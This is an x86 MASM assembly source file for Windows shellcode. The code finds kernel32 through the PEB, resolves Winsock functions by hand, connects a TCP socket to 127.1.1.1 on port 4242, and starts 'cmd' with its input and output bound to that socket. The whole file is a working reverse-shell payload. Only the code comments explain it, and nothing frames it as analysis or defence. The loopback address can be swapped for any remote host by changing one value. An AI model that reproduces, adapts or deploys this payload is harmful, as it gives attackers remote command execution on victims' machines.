.386
.model flat, stdcall
option  CaseMap:None

.code
main PROC
	ASSUME FS:NOTHING

	; Find kernel32.dll base address
	xor ecx, ecx
	mov eax, [fs:30h + ecx]
	mov eax, [eax + 0Ch]
	mov esi, [eax + 14h]
	lodsd
	xchg eax, esi
	lodsd
	xchg eax, esi
	lodsd
	mov ebx, [eax + 10h]

	; Find kernel32.dll export table
	mov edx, [ebx + 3Ch]
	add edx, ebx
	mov edx, [edx + 78h]
	add edx, ebx
	mov esi, [edx + 20h]
	add esi, ebx

	; Find GetProcAddress function name
	xor ecx, ecx
	dec ecx
	loop_name:
		inc ecx
		lodsd
		add eax, ebx
		cmp dword ptr [eax], 50746547h
		jnz loop_name
		cmp dword ptr [eax + 4h], 41636F72h
		jnz loop_name

	; Find GetProcAddress address
	mov esi, [edx + 24h]
	add esi, ebx
	mov cx, word ptr [esi + ecx * 2]
	mov esi, [edx + 1Ch]
	add esi, ebx
	mov edi, [esi + ecx * 4]
	add edi, ebx

	; GetProcAddress(kernel32.dll, "LoadLibraryA")
	push ebx
	push 41797261h
	push 7262694Ch
	push 64616F4Ch
	push esp
	push ebx
	call edi

	; LoadLibrary("ws2_32.dll")
	pushw bx
	pushw 6C6Ch
	push 642E3233h
	push 5F327377h
	push esp
	call eax

	; GetProcAddress(ws2_32.dll, "WSAStartup")
	xchg eax, esi
	pushw bx
	pushw 7075h
	push 74726174h
	push 53415357h
	push esp
	push esi
	call edi

	; WSAStartUp(0, &wsaData)
	xor ecx, ecx
	mov cx, 190h
	sub esp, ecx
	push esp
	push ecx
	call eax

	; GetProcAddress(ws2_32.dll, "WSASocketA")
	pushw bx
	pushw 4174h
	push 656B636Fh
	push 53415357h
	push esp
	push esi
	call edi

	; sockt = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)
	xor ecx, ecx
	push ecx
	push ecx
	push ecx
	push 6
	push 1
	push 2
	call eax

	; GetProcAddress(ws2_32.dll, "connect")
	xchg eax, ebp
	push 74636501h
	shr dword ptr [esp], 8
	push 6e6e6f63h
	push esp
	push esi
	call edi

	; connect(sockt, [AF_INET, port, ip], sizeof(struct sockaddr))
    ; Host: 127.1.1.1, Port: 4242
	push 0101017Fh
	pushw 9210h
	pushw 02h
	mov ecx, esp
	push 10h
	push ecx
	push ebp
	call eax

	; GetProcAddress(kernel32.dll, "CreateProcessA")
	push ebx
	pushw 4173h
	push 7365636Fh
	push 72506574h
	push 61657243h
	push esp
	push ebx
	call edi

	; ebx = "cmd"
	push 646D6301h
	shr dword ptr [esp], 8
	mov ebx, esp

	; edi = &pinfo
	sub esp, 10h
	mov edi, esp

	; edi = &sinfo
	push ebp
	push ebp
	push ebp
	xor edx, edx
	push edx
	push edx
	mov dh, 1
	push edx
	xor edx, edx
	push 09h
	pop ecx
	rep9:
		push edx
		loop rep9
	push edx
	push 44h
	mov edx, esp

	; CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
	push edi
	push edx
	push ecx
	push ecx
	push ecx
	push 1
	push ecx
	push ecx
	push ebx
	push ecx
	call eax
	
main ENDP

END main
